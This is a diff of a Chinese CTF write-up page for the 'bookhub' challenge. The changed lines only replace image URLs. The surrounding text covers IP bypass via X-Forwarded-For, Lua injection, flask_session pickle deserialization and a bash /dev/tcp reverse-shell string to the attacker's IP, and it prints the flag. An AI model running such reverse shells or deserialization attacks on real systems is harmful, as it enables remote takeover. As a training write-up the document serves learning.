@@ -111,7 +111,7 @@ hint: www.zip</p>
 <h3>0x01 Bypass IP</h3>
 <p>太垃圾了了，一开始掉进了XFF的坑里</p>
 <blockquote>
-<p><img alt="" src="https://img.virzz.com/15329721713858.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329721713858.jpg" /></p>
 </blockquote>
 <p><strong>./bookhub/forms.py</strong></p>
 <pre><code class="python">class LoginForm(FlaskForm):
@@ -139,11 +139,11 @@ hint: www.zip</p>
 </code></pre>
 
 <p>仔细看的时候才发现有个特殊的IP</p>
-<p><img alt="" src="https://img.virzz.com/15329693228681.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329693228681.jpg" /></p>
 <p>扫一波端口发现<strong>5000</strong>，访问后是新大陆</p>
-<p><img alt="" src="https://img.virzz.com/15329695869457.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329695869457.jpg" /></p>
 <p><strong>debug mode</strong></p>
-<p><img alt="" src="https://img.virzz.com/15329696502354.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329696502354.jpg" /></p>
 <h4>X-Forwarded-For(XFF)伪造</h4>
 <blockquote>
 <p>X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。</p>
@@ -287,7 +287,7 @@ inputs ={ &quot;bookhub:session:sid&quot; } -- &quot; }
 </code></pre>
 
 <p>其实一开始，没想到用<strong>urlDecode</strong>，Lua的十六进制用<code>\XX</code>而不是常见的<code>\xXX</code>，</p>
-<p><img alt="" src="https://img.virzz.com/15329727168502.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329727168502.jpg" /></p>
 <p>神一般的操作</p>
 <h3>0x04 flask_session Pickle &amp; Rebound Shell</h3>
 <p><strong>#flask_session/sessions.py</strong></p>
@@ -325,7 +325,7 @@ inputs ={ &quot;bookhub:session:sid&quot; } -- &quot; }
 <p>服务器有毒，<code>s = """/bin/bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1""" % (
             listen_ip, listen_port)</code>，<strong>bash反弹</strong>死活不成功</p>
 <p>然后<strong>perl</strong>反弹成功了</p>
-<p><img alt="" src="https://img.virzz.com/15329714123968.jpg" /></p>
+<p><img alt="" src="https://oiyrlilrd.bkt.clouddn.com/15329714123968.jpg" /></p>
 <p><strong>Flag : rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}</strong></p>
 <h2>exp.py</h2>
 <pre><code class="python"># -*- coding:utf-8 -*-
